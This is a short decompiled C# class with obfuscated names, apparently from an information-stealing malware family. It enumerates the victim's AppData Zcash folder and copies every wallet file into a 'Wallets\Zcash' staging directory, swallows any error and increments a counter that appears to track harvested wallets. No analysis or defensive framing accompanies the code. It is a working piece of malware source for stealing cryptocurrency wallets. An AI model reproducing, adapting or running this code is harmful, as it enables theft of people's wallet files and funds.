using System;
using System.IO;
using Moist;

// Token: 0x02000066 RID: 102
internal class Class38
{
	// Token: 0x0600026F RID: 623 RVA: 0x000131E8 File Offset: 0x000113E8
	public static void smethod_0(string string_1)
	{
		try
		{
			foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppDate + "\\Zcash\\").GetFiles())
			{
				Directory.CreateDirectory(string_1 + Class38.string_0);
				fileInfo.CopyTo(string_1 + Class38.string_0 + fileInfo.Name);
			}
			Class37.int_0++;
		}
		catch
		{
		}
	}

	// Token: 0x06000270 RID: 624 RVA: 0x0000446C File Offset: 0x0000266C
	public Class38()
	{
		Class40.gcO0h7LzslQIW();
		base..ctor();
	}

	// Token: 0x06000271 RID: 625 RVA: 0x00005397 File Offset: 0x00003597
	// Note: this type is marked as 'beforefieldinit'.
	static Class38()
	{
		Class40.gcO0h7LzslQIW();
		Class38.int_0 = 0;
		Class38.string_0 = "\\Wallets\\Zcash\\";
	}

	// Token: 0x04000119 RID: 281
	public static int int_0;

	// Token: 0x0400011A RID: 282
	public static string string_0;
}
